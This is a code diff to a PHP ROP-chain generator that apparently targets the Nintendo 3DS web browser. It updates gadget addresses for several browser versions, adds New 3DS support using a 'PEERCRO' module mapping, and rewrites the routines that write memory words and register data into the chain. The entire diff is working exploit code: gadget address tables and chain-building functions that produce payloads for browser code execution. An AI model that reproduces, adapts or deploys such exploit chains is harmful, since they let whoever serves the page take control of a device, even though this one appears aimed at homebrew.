@@ -117,7 +117,7 @@ if($browserver == 1)
 
 	$ROP_STR_R1TOR0 = 0x00140acc;//"str r1, [r0]" "bx lr"
 	$ROP_LDR_R0FROMR0 = 0x00179d54;//"ldr r0, [r0]" "bx lr"
-	$ROP_STR_R1_TOR0_SHIFTR2 = 0x001e96b4;//"str r1, [r0, r2, lsl #2]" "bx lr"
+	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x001e96b4;//"str r1, [r0, r2, lsl #2]" "bx lr"
 	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x001649e8;//"ldr r0, [r0, r1, lsl #2]" "bx lr"
 	$ROP_ADDR0_TO_R1 = 0x0012d258;//"add r0, r0, r1" "bx lr"
 
@@ -129,9 +129,6 @@ if($browserver == 1)
 	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x0025ee6c;//if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> branch to: "pop {r4, r5, r6, r7, r8, pc}"}
 
 	$ROP_STMR0_R0PC = 0x0010012c;//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}" "bx lr"
-
-	//$ROP_MEMCPY = 0x002856ac;
-	//$ROP_MEMSETOTHER = 0x0027b2f0;//r0=addr, r1=size, r2=value
 
 	$ROP_INFINITELP = 0x0024847d;//thumb "b ."
 
@@ -194,7 +191,7 @@ else if($browserver == 2)
 
 	$ROP_STR_R1TOR0 = 0x00141224;
 	$ROP_LDR_R0FROMR0 = 0x00179100;
-	$ROP_STR_R1_TOR0_SHIFTR2 = 0x001ebad4;
+	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x001ebad4;
 	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00167730;
 	$ROP_ADDR0_TO_R1 = 0x0012d588;
 
@@ -203,9 +200,6 @@ else if($browserver == 2)
 	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x003549ec;//if(ip!=0){r0 = <threadlocalstorageptr>; <write r0 to r5+4> branch over a function-call} <func-call that can be skipped> *(((u32*)r5+8)++; r0=r4; "pop {r4, r5, r6, pc}"
 
 	$ROP_STMR0_R0PC = 0x0010012c;
-
-	//$ROP_MEMCPY = 0x002848dc;
-	//$ROP_MEMSETOTHER = 0x00269768;
 
 	//$ROP_CLOSEHANDLE = genu32_unicode(0x001569dc);
 
@@ -264,7 +258,7 @@ else if($browserver == 3)
 
 		$ROP_STR_R1TOR0 = 0x001040d4;
 		$ROP_LDR_R0FROMR0 = 0x0011168c;
-		$ROP_STR_R1_TOR0_SHIFTR2 = 0x003329f4;
+		//$ROP_STR_R1_TOR0_SHIFTR2 = 0x003329f4;
 		$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101218;
 		$ROP_ADDR0_TO_R1 = 0x0012bb98;
 
@@ -273,9 +267,6 @@ else if($browserver == 3)
 		$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x0016882c;//if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> *(((u32*)r4+8)++; r0=1} "pop {r4, pc}"
 
 		$ROP_STMR0_R0PC = 0x001bb4c4;
-
-		//$ROP_MEMCPY = 0x0023ff64;
-		//$ROP_MEMSETOTHER = 0x0023c568;
 
 		$SRVPORT_HANDLEADR = 0x003d968c;
 		$SRV_REFCNT = 0x003d8f64;
@@ -326,7 +317,7 @@ else if($browserver == 3)
 
 		$ROP_STR_R1TOR0 = 0x00103ba4;
 		$ROP_LDR_R0FROMR0 = 0x0010e98c;
-		$ROP_STR_R1_TOR0_SHIFTR2 = 0x003327fc;
+		//$ROP_STR_R1_TOR0_SHIFTR2 = 0x003327fc;
 		$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101208;
 		$ROP_ADDR0_TO_R1 = 0x001a3bfc;
 
@@ -387,7 +378,7 @@ else if($browserver == 4)
 
 	$ROP_STR_R1TOR0 = 0x001040c0;
 	$ROP_LDR_R0FROMR0 = 0x00111668;
-	$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;
+	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;
 	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;
 	$ROP_ADDR0_TO_R1 = 0x0012bb50;
 
@@ -396,9 +387,6 @@ else if($browserver == 4)
 	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00168848;//Same code as browserver val3.
 
 	$ROP_STMR0_R0PC = 0x001bb4cc;
-
-	//$ROP_MEMCPY = 0x0023ff60;
-	//$ROP_MEMSETOTHER = 0x0023c570;
 
 	$SRVPORT_HANDLEADR = 0x003d968c;
 	$SRV_REFCNT = 0x003d8f64;
@@ -440,6 +428,7 @@ else if($browserver == 0x80)//new3ds
 	$CODEBLK_ENDADR = 0x00422000;
 	$OSSCRO_HEAPADR = 0x0810e000;
 	$WEBKITCRO_HEAPADR = 0x083cc000;
+	$PEERCRO_HEAPADR = 0x082e7000;
 	$APPHEAP_PHYSADDR = 0x2b000000;
 	init_mapaddrs_cro();
 
@@ -455,15 +444,15 @@ else if($browserver == 0x80)//new3ds
 
 	$ROP_STR_R1TOR0 = 0x002258a4;
 	$ROP_LDR_R0FROMR0 = 0x001f6a60;
-	$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;//needs updated
-	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;//needs updated
+	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;//needs updated (doesn't exist with SKATER)
+	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0xf8cfc;
 	$ROP_ADDR0_TO_R1 = 0x0027a2c0;
 
-	$ROP_LDMSTM_R5R4_R0R3 = 0x001d3f04;//needs updated
+	$ROP_LDMSTM_R5R4_R0R3 = 0x001e7d10;//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r6, {r0, r1, r2, r3}" branch to: "vpop {d8}" "pop {r4, r5, r6, pc}"
 
 	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00295b8c;//Same code as browserver val3.
 
-	$ROP_STMR0_R0PC = 0x001bb4cc;//needs updated
+	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x1ee9d;//Thumb: "stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" nop "movs r0, #20". branch to: "pop {r4, r5, r6, pc}"
 
 	$SRVPORT_HANDLEADR = 0x003d9f80;
 	$SRV_REFCNT = 0x003d9da8;
@@ -488,13 +477,13 @@ else if($browserver == 0x80)//new3ds
 	$IFile_Read = 0x001686dc;//needs updated
 	$IFile_Write = 0x00168764;//needs updated
 
-	$FS_DELETEFILE = 0x001683c0;//needs updated
+	$FS_DELETEFILE = 0x0032368c;
 
-	$FSFILEIPC_CLOSE = 0x0027ec60;//needs updated
-	$FSFILEIPC_READ = 0x0027ec08;//needs updated
-	$FSFILEIPC_GETSIZE = 0x0027ecec;//needs updated
+	$FSFILEIPC_CLOSE = 0x00266764;
+	$FSFILEIPC_READ = 0x0026670c;
+	$FSFILEIPC_GETSIZE = 0x003324c4;
 
-	$OPENFILEDIRECTLY_WRAP = 0x0027b600;//needs updated
+	//$OPENFILEDIRECTLY_WRAP = 0x0027b600;//needs updated (doesn't exist with SKATER)
 
 	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
 	//$APT_DoApplicationJump = 0x0029953c;//needs updated
@@ -587,9 +576,10 @@ function genu32_unicode_jswrap($value)
 
 function init_mapaddrs_cro()
 {
-	global $OSSCRO_MAPADR, $WEBKITCRO_MAPADR, $OSSCRO_HEAPADR, $WEBKITCRO_HEAPADR, $CODEBLK_ENDADR;
+	global $OSSCRO_MAPADR, $WEBKITCRO_MAPADR, $OSSCRO_HEAPADR, $PEERCRO_MAPADR, $WEBKITCRO_HEAPADR, $PEERCRO_HEAPADR, $CODEBLK_ENDADR, $browserver;
 	$OSSCRO_MAPADR = ($OSSCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
 	$WEBKITCRO_MAPADR = ($WEBKITCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
+	if($browserver>=0x80)$PEERCRO_MAPADR = ($PEERCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
 }
 
 function generate_ropchain()
@@ -651,7 +641,7 @@ function ropgen_callfunc($r0, $r1, $r2, $r3, $lr, $pc)
 
 function ropgen_writeu32($addr, $value, $shiftval, $setr0)
 {
-	global $ROPCHAIN, $POPPC, $ROP_STR_R1TOR0, $ROP_STR_R1_TOR0_SHIFTR2, $POPLRPC, $ROP_POP_R1R5PC;
+	global $ROPCHAIN, $POPPC, $ROP_STR_R1TOR0, $POPLRPC, $ROP_POP_R1R5PC;//, $ROP_STR_R1_TOR0_SHIFTR2;
 
 	if($shiftval==0)
 	{
@@ -669,7 +659,28 @@ function ropgen_writeu32($addr, $value, $shiftval, $setr0)
 	}
 	else
 	{
-		if($setr0!=0)
+		$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+		$ROPCHAIN.= genu32_unicode($shiftval << 2);//r1
+		$ROPCHAIN.= genu32_unicode(0);//r2
+		$ROPCHAIN.= genu32_unicode(0x0);//r3
+		$ROPCHAIN.= genu32_unicode(0x0);//r4
+		$ROPCHAIN.= genu32_unicode(0x0);//r5
+
+		$ROPCHAIN.= genu32_unicode($POPLRPC);
+		$ROPCHAIN.= genu32_unicode($POPPC);
+
+		$ROPCHAIN.= genu32_unicode($ROP_ADDR0_TO_R1);
+
+		$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
+		$ROPCHAIN.= genu32_unicode($value);//r1
+		$ROPCHAIN.= genu32_unicode(0x0);//r2
+		$ROPCHAIN.= genu32_unicode(0x0);//r3
+		$ROPCHAIN.= genu32_unicode(0x0);//r4
+		$ROPCHAIN.= genu32_unicode(0x0);//r5
+
+		$ROPCHAIN.= genu32_unicode($ROP_STR_R1TOR0);
+
+		/*if($setr0!=0)
 		{
 			ropgen_callfunc($addr, $value, $shiftval, 0x0, $POPPC, $ROP_STR_R1_TOR0_SHIFTR2);
 		}
@@ -686,7 +697,7 @@ function ropgen_writeu32($addr, $value, $shiftval, $setr0)
 			$ROPCHAIN.= genu32_unicode(0x0);//r5
 
 			$ROPCHAIN.= genu32_unicode($ROP_STR_R1_TOR0_SHIFTR2);
-		}
+		}*/
 	}
 }
 
@@ -836,28 +847,71 @@ function ropgen_write_procid_cmdbuf($indexword)//This writes the current process
 
 function ropgen_writeregdata($addr, $data, $pos)
 {
-	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC;
+	global $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0IPPC, $ROP_STMR0_R0PC, $browserver;
 
-	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	if($browserver<0x80)
+	{
+		$ROPCHAIN.= genu32_unicode($POPLRPC);
 
-	$ROPCHAIN.= genu32_unicode($POPPC);//lr
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0IPPC);
+		$ROPCHAIN.= genu32_unicode($POPPC);//lr
+		$ROPCHAIN.= genu32_unicode($ROP_POP_R0IPPC);
 
-	$ROPCHAIN.= genu32_unicode($addr);
-	$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x30-bytes total from $data
-	$ROPCHAIN.= genu32_unicode($data[$pos+1]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+2]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+3]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+4]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+5]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+6]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+7]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+8]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+9]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+10]);
-	$ROPCHAIN.= genu32_unicode($data[$pos+11]);
+		$ROPCHAIN.= genu32_unicode($addr);
+		$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x30-bytes total from $data
+		$ROPCHAIN.= genu32_unicode($data[$pos+1]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+2]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+3]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+4]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+5]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+6]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+7]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+8]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+9]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+10]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+11]);
 
-	$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}"
+		$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}"
+	}
+	else
+	{
+		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R8PC);
+
+		$ROPCHAIN.= genu32_unicode($addr);
+		$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x1c-bytes from $data
+		$ROPCHAIN.= genu32_unicode($data[$pos+1]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+2]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+3]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+4]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+5]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+6]);
+		$ROPCHAIN.= genu32_unicode(0);//r8
+		
+		$pos+=7;
+		$addr+=0x1c;
+
+		$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);//"stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" ... "pop {r4, r5, r6, pc}"
+
+		$ROPCHAIN.= genu32_unicode(0);//r4
+		$ROPCHAIN.= genu32_unicode(0);//r5
+		$ROPCHAIN.= genu32_unicode(0);//r6
+
+		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R8PC);
+
+		$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x14-bytes from $data
+		$ROPCHAIN.= genu32_unicode($data[$pos+1]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+2]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+3]);
+		$ROPCHAIN.= genu32_unicode($data[$pos+4]);
+		$ROPCHAIN.= genu32_unicode(0);
+		$ROPCHAIN.= genu32_unicode(0);
+		$ROPCHAIN.= genu32_unicode(0);//r8
+
+		$ROPCHAIN.= genu32_unicode($ROP_STMR0_R0PC);
+
+		$ROPCHAIN.= genu32_unicode(0);//r4
+		$ROPCHAIN.= genu32_unicode(0);//r5
+		$ROPCHAIN.= genu32_unicode(0);//r6
+	}
 }
 
 function ropgen_writeregdata_wrap($addr, $data, $pos, $size)//write the u32s from array $data starting at index $pos, to $addr with byte-size $size.
@@ -900,7 +954,7 @@ function ropgen_writeregdata_wrap($addr, $data, $pos, $size)//write the u32s fro
 
 function ropgen_ldm_r0r3($ldm_addr, $stm_addr)
 {
-	global $ROPCHAIN, $ROP_POP_R0R6PC, $ROP_LDMSTM_R5R4_R0R3;
+	global $ROPCHAIN, $ROP_POP_R0R6PC, $ROP_LDMSTM_R5R4_R0R3, $browserver;
 
 	if($stm_addr==0)$stm_addr = $ldm_addr;
 
@@ -911,9 +965,15 @@ function ropgen_ldm_r0r3($ldm_addr, $stm_addr)
 	$ROPCHAIN.= genu32_unicode(0x0);//r3
 	$ROPCHAIN.= genu32_unicode($stm_addr);//r4
 	$ROPCHAIN.= genu32_unicode($ldm_addr);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
+	$ROPCHAIN.= genu32_unicode($stm_addr);//r6
 
 	$ROPCHAIN.= genu32_unicode($ROP_LDMSTM_R5R4_R0R3);//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r4, {r0, r1, r2, r3}" "popne {r4, r5, r6, pc}"
+
+	if($browserver >= 0x80)
+	{
+		$ROPCHAIN.= genu32_unicode(0x0);//two words for d8
+		$ROPCHAIN.= genu32_unicode(0x0);
+	}
 
 	$ROPCHAIN.= genu32_unicode(0x0);//r4
 	$ROPCHAIN.= genu32_unicode(0x0);//r5
